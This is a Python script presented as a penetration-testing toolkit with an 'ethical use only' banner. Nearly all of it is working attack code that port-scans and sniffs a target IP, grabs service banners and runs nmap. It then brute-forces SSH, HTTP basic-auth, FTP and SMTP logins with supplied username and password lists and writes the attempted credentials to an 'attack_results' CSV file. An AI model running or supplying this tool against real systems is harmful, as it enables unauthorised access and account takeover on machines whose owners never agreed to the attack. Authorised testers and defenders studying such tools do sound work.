# ultimate_pentest_toolkit.py
# ⚠️ ETHICAL USE ONLY – LAB ENVIRONMENTS OR AUTHORIZED SYSTEMS
appVersion="1.0.0.0"
import socket
import threading
import paramiko
from scapy.all import sniff
from scapy.layers.inet import IP
import nmap
import csv
import requests
from ftplib import FTP
import smtplib

# ------------------------
# Global variables
# ------------------------
open_ports = []
lock = threading.Lock()
results = []

# ------------------------
# 1. Port scanning
# ------------------------
def scan_port(host, port):
    try:
        sock = socket.socket()
        sock.settimeout(0.5)
        if sock.connect_ex((host, port)) == 0:
            with lock:
                open_ports.append(port)
                print(f"[OPEN] Port {port}")
        sock.close()
    except Exception as e:
        print(f"Error scanning port {port}: {e}")

def threaded_scan(host, port_range=range(1, 1025), threads=50):
    thread_list = []
    for port in port_range:
        t = threading.Thread(target=scan_port, args=(host, port))
        t.start()
        thread_list.append(t)
        if len(threading.enumerate()) > threads:
            t.join()
    for t in thread_list:
        t.join()
    return open_ports

# ------------------------
# 2. Banner grabbing
# ------------------------
def banner_grab(host, port):
    try:
        s = socket.socket()
        s.connect((host, port))
        s.settimeout(2)
        banner = s.recv(1024).decode().strip()
        return banner
    except:
        return None
    finally:
        s.close()

# ------------------------
# 3. Nmap scanning
# ------------------------
def nmap_scan(host, port_range='1-1024'):
    nm = nmap.PortScanner()
    nm.scan(host, port_range)
    return {host: nm[host].all_protocols()}

# ------------------------
# 4. Packet sniffing
# ------------------------
def packet_sniffer(count=10):
    def callback(packet):
        if packet.haslayer(IP):
            print(f"Packet: {packet[IP].src} -> {packet[IP].dst}")
    sniff(prn=callback, filter="ip", count=count)

# ------------------------
# 5. SSH Brute-force
# ------------------------
def ssh_brute_force(host, username, password_list):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for pwd in password_list:
        try:
            ssh.connect(host, username=username, password=pwd)
            print(f"[SUCCESS] SSH {username}:{pwd}")
            results.append(['SSH', username, pwd, 'SUCCESS'])
        except:
            print(f"[FAILED] SSH {username}:{pwd}")
            results.append(['SSH', username, pwd, 'FAILED'])

# ------------------------
# 6. HTTP Brute-force
# ------------------------
def http_brute_force(host, usernames, passwords):
    url = f"http://{host}"
    for user in usernames:
        for pwd in passwords:
            try:
                r = requests.get(url, auth=(user, pwd), timeout=3)
                if r.status_code == 200:
                    print(f"[SUCCESS] HTTP {user}:{pwd}")
                    results.append(['HTTP', user, pwd, 'SUCCESS'])
                else:
                    print(f"[FAILED] HTTP {user}:{pwd}")
                    results.append(['HTTP', user, pwd, 'FAILED'])
            except:
                results.append(['HTTP', user, pwd, 'ERROR'])

# ------------------------
# 7. FTP Brute-force
# ------------------------
def ftp_brute_force(host, usernames, passwords):
    for user in usernames:
        for pwd in passwords:
            try:
                ftp = FTP(host, timeout=3)
                ftp.login(user, pwd)
                print(f"[SUCCESS] FTP {user}:{pwd}")
                results.append(['FTP', user, pwd, 'SUCCESS'])
                ftp.quit()
            except:
                print(f"[FAILED] FTP {user}:{pwd}")
                results.append(['FTP', user, pwd, 'FAILED'])

# ------------------------
# 8. SMTP Brute-force
# ------------------------
def smtp_brute_force(host, usernames, passwords):
    for user in usernames:
        for pwd in passwords:
            try:
                server = smtplib.SMTP(host, timeout=3)
                server.login(user, pwd)
                print(f"[SUCCESS] SMTP {user}:{pwd}")
                results.append(['SMTP', user, pwd, 'SUCCESS'])
                server.quit()
            except:
                print(f"[FAILED] SMTP {user}:{pwd}")
                results.append(['SMTP', user, pwd, 'FAILED'])

# ------------------------
# 9. Logging results
# ------------------------
def log_results(filename):
    with open(filename, 'w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(['Service', 'Username', 'Password', 'Status'])
        for row in results:
            writer.writerow(row)
    print(f"Results saved to {filename}")

# ------------------------
# 10. Main CLI
# ------------------------
if __name__ == "__main__":
    target = input("Enter target IP: ")

    # Port scanning
    print("\n[1] Multi-threaded port scanning (1-1024)...")
    threaded_scan(target, range(1, 1025))

    # Banner grabbing
    print("\n[2] Banner grabbing...")
    for port in open_ports:
        banner = banner_grab(target, port)
        print(f"Port {port}: {banner}")

    # Nmap scan
    print("\n[3] NMAP scan (1-1024)...")
    print(nmap_scan(target))

    # Packet sniffing
    print("\n[4] Packet sniffing (10 packets)...")
    packet_sniffer(count=10)

    # SSH brute-force
    print("\n[5] SSH brute-force")
    ssh_user = input("SSH username: ")
    ssh_pass_list = input("Comma-separated SSH passwords: ").split(',')
    ssh_brute_force(target, ssh_user, ssh_pass_list)

    # HTTP brute-force
    print("\n[6] HTTP brute-force")
    http_users = input("Comma-separated HTTP usernames: ").split(',')
    http_pass = input("Comma-separated HTTP passwords: ").split(',')
    http_brute_force(target, http_users, http_pass)

    # FTP brute-force
    print("\n[7] FTP brute-force")
    ftp_users = input("Comma-separated FTP usernames: ").split(',')
    ftp_pass = input("Comma-separated FTP passwords: ").split(',')
    ftp_brute_force(target, ftp_users, ftp_pass)

    # SMTP brute-force
    print("\n[8] SMTP brute-force")
    smtp_users = input("Comma-separated SMTP usernames: ").split(',')
    smtp_pass = input("Comma-separated SMTP passwords: ").split(',')
    smtp_brute_force(target, smtp_users, smtp_pass)

    # Logging all attack results
    log_results(f"attack_results_{target}.csv")